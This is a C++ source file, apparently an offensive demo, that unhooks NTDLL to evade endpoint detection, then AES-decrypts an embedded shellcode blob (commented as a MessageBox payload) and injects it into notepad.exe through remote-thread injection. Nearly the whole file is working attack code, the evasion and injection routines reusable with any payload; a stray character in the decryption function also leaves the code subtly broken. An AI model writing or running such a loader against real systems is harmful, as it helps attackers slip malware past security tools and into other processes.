#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <wchar.h> // Required for _wcsicmp

// The AES-encrypted 64-bit MessageBox shellcode
unsigned char payload[] = {
0x35, 0x4e, 0xb1, 0xa3, 0xf5, 0xb7, 0x61, 0x37, 0x67, 0xff, 0xdf, 0xa6, 0xf1, 0xdc, 0xaf, 0x5f, 0x07, 0x7e, 0x9a, 0xd1, 0x87, 0x2a, 0x52, 0xac, 0x28, 0xfb, 0xa2, 0xe0, 0x2c, 0x16, 0xfa, 0x04, 0x05, 0x9f, 0xe5, 0x12, 0x39, 0x5a, 0x76, 0x6a, 0xe7, 0x18, 0xd9, 0x33, 0x1b, 0xbd, 0x35, 0x14, 0x79, 0x8a, 0xfd, 0x6a, 0x54, 0x59, 0x43, 0xaa, 0xdd, 0xf6, 0x8c, 0x80, 0x81, 0xe7, 0x2d, 0xf8, 0x2a, 0x4e, 0xf4, 0xf2, 0xc7, 0x8c, 0x41, 0x37, 0x76, 0x60, 0xe3, 0xf3, 0xe5, 0xa7, 0xc6, 0x1f, 0xed, 0xe9, 0x20, 0x5d, 0xf2, 0xf7, 0x33, 0x0f, 0x9d, 0xb0, 0xdc, 0x38, 0x8a, 0xe0, 0xb3, 0x66, 0xea, 0x38, 0x08, 0xc7, 0x8d, 0x09, 0xbd, 0x02, 0xfb, 0x7b, 0xa9, 0xef, 0x6e, 0xe9, 0x65, 0xb5, 0xbf, 0x9c, 0xe1, 0x44, 0x5f, 0xaa, 0xfc, 0x37, 0xed, 0xc8, 0x39, 0xc9, 0xa9, 0x38, 0x1c, 0x13, 0xc8, 0x9a, 0x4b, 0x71, 0xb9, 0x06, 0xd9, 0x7f, 0xab, 0x5c, 0x2b, 0x06, 0xb8, 0xd1, 0x91, 0x7a, 0x6a, 0x04, 0x60, 0xdd, 0x62, 0xc4, 0x67, 0xf3, 0x99, 0xf5, 0x6c, 0x6c, 0x26, 0x65, 0xae, 0xd5, 0xfd, 0x87, 0x1e, 0xaa, 0x0a, 0x1c, 0x66, 0xb4, 0x6c, 0xf7, 0x73, 0x3b, 0x51, 0x4e, 0xeb, 0x91, 0x0b, 0xfa, 0x4b, 0x8d, 0xff, 0x8e, 0x1d, 0x1c, 0xbe, 0x4b, 0x0d, 0x3f, 0xd4, 0x69, 0x13, 0xd9, 0xbc, 0xfe, 0x1e, 0x2e, 0xf9, 0x44, 0xb6, 0xc1, 0xa5, 0xfc, 0x28, 0x01, 0xc4, 0xd7, 0x88, 0x96, 0x1f, 0x31, 0x20, 0x24, 0xc2, 0x65, 0x9a, 0x69, 0xe7, 0x0c, 0x1b, 0x06, 0xc6, 0xcb, 0xe4, 0x9a, 0x5d, 0x74, 0xdb, 0x55, 0xb0, 0xf4, 0x2d, 0xd0, 0xb0, 0xd8, 0xb2, 0xe6, 0x76, 0x1a, 0x67, 0x69, 0x7b, 0x18, 0xb3, 0xe2, 0xe0, 0x36, 0x11, 0x22, 0x44, 0x7a, 0x72, 0x5e, 0xb6, 0xc5, 0x35, 0xb3, 0x2a, 0x40, 0x80, 0x3a, 0xbc, 0xf2, 0x3b, 0x07, 0x78, 0x50, 0xdf, 0x35, 0x59, 0xb3, 0xdf, 0xa3, 0xbd, 0xfa, 0x2a, 0xa0, 0x1a, 0xec, 0x0c, 0xe3, 0x11, 0x39, 0xf7, 0xe8, 0x6f, 0xc3, 0x68, 0x0c
};

// The key that corresponds to the payload above
unsigned char key[] = { 0x62, 0xb8, 0x7d, 0x5d, 0xd8, 0x04, 0x5a, 0x06, 0xb7, 0xf3, 0x08, 0xb0, 0x36, 0x8b, 0x15, 0x37 };

// Decrypts an AES-256 encrypted payload in place
bool AESDecrypt(BYTE* pPayload, DWORD dwPayloadSize, BYTE* pKey, DWORD dwKeySize) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }a
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return false;
    }
    if (!CryptHashData(hHash, pKey, dwKeySize, 0)) {
        return false;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return false;
    }
    
    // The 'Final' parameter is set to TRUE to correctly handle cryptographic padding
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, TRUE, 0, pPayload, &dwPayloadSize)) {
        return false;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    return true;
}

// Finds the Process ID (PID) for a given process name
DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32FirstW(hSnapshot, &processInfo)) {
        do {
            if (_wcsicmp(processName.c_str(), processInfo.szExeFile) == 0) {
                CloseHandle(hSnapshot);
                return processInfo.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &processInfo));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Unhooks NTDLL by overwriting the .text section with a fresh copy from disk
bool PerformUnhooking() {
    wprintf(L"[INFO] Attempting to unhook NTDLL.DLL...\n");

    HANDLE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        wprintf(L"[ERROR] Could not get a handle to the loaded ntdll.dll. Error: %lu\n", GetLastError());
        return false;
    }

    wchar_t ntdllPath[MAX_PATH];
    GetSystemDirectoryW(ntdllPath, MAX_PATH);
    wcscat_s(ntdllPath, L"\\ntdll.dll");

    HANDLE hNtdllFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hNtdllFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[ERROR] Could not open ntdll.dll from disk. Error: %lu\n", GetLastError());
        return false;
    }

    HANDLE hNtdllMapping = CreateFileMappingW(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (hNtdllMapping == NULL) {
        wprintf(L"[ERROR] Could not create file mapping. Error: %lu\n", GetLastError());
        CloseHandle(hNtdllFile);
        return false;
    }

    LPVOID pNtdllFresh = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllFresh == NULL) {
        wprintf(L"[ERROR] Could not map view of file. Error: %lu\n", GetLastError());
        CloseHandle(hNtdllMapping);
        CloseHandle(hNtdllFile);
        return false;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllFresh;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pNtdllFresh + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSectionHeader->Name, ".text") == 0) {
            
            DWORD oldProtect = 0;
            LPVOID textSectionAddress = (LPVOID)((BYTE*)hNtdll + pSectionHeader->VirtualAddress);
            SIZE_T textSectionSize = pSectionHeader->Misc.VirtualSize;

            if (!VirtualProtect(textSectionAddress, textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                wprintf(L"[ERROR] VirtualProtect (to RWX) failed. Error: %lu\n", GetLastError());
                break;
            }

            wprintf(L"[INFO] Found .text section. Overwriting hooks...\n");
            memcpy(textSectionAddress, (LPVOID)((BYTE*)pNtdllFresh + pSectionHeader->VirtualAddress), textSectionSize);

            if (!VirtualProtect(textSectionAddress, textSectionSize, oldProtect, &oldProtect)) {
                wprintf(L"[ERROR] VirtualProtect (to restore) failed. Error: %lu\n", GetLastError());
            }

            wprintf(L"[SUCCESS] NTDLL unhooking complete.\n");
            
            UnmapViewOfFile(pNtdllFresh);
            CloseHandle(hNtdllMapping);
            CloseHandle(hNtdllFile);
            return true;
        }
        pSectionHeader++;
    }

    wprintf(L"[ERROR] Could not find the .text section.\n");
    UnmapViewOfFile(pNtdllFresh);
    CloseHandle(hNtdllMapping);
    CloseHandle(hNtdllFile);
    return false;
}

// Injects the payload into a target process
bool InjectPayload(DWORD pid, BYTE* pPayload, DWORD dwPayloadSize) {
    
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (hProcess == NULL) {
        wprintf(L"[ERROR] Could not open target process. Error: %lu\n", GetLastError());
        return false;
    }
    wprintf(L"[INFO] Obtained handle to process %lu\n", pid);

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, dwPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        wprintf(L"[ERROR] Could not allocate memory in target process. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return false;
    }
    wprintf(L"[INFO] Allocated memory in target process at 0x%p\n", pRemoteBuffer);

    if (!WriteProcessMemory(hProcess, pRemoteBuffer, pPayload, dwPayloadSize, NULL)) {
        wprintf(L"[ERROR] Could not write payload to target process. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return false;
    }
    wprintf(L"[INFO] Wrote %u bytes to target process.\n", (unsigned int)dwPayloadSize);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        wprintf(L"[ERROR] Could not create remote thread. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return false;
    }
    wprintf(L"[SUCCESS] Injected payload and created remote thread.\n");
    
    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}


int main() {
    wprintf(L"--- EDR Evasion: NTDLL Unhooking and Process Injection Demo ---\n");

    if (!PerformUnhooking()) {
        wprintf(L"[FATAL] Could not unhook NTDLL. Aborting injection.\n");
        system("pause");
        return -1;
    }
    
    wprintf(L"\n[ACTION] Press ENTER to find notepad.exe and inject the payload...\n");
    system("pause");

    DWORD pid = FindProcessId(L"notepad.exe");
    if (pid == 0) {
        wprintf(L"[ERROR] Could not find notepad.exe. Please open Notepad and try again.\n");
        system("pause");
        return -1;
    }
    wprintf(L"[INFO] Found notepad.exe with PID: %lu\n", pid);

    if (!AESDecrypt(payload, sizeof(payload), key, sizeof(key))) {
        wprintf(L"[FATAL] Could not decrypt payload. Error: %lu\n", GetLastError());
        system("pause");
        return -1;
    }
    wprintf(L"[INFO] Payload decrypted successfully.\n");

    InjectPayload(pid, payload, sizeof(payload));

    wprintf(L"\n--- Demo Complete ---\n");
    system("pause");

    return 0;
}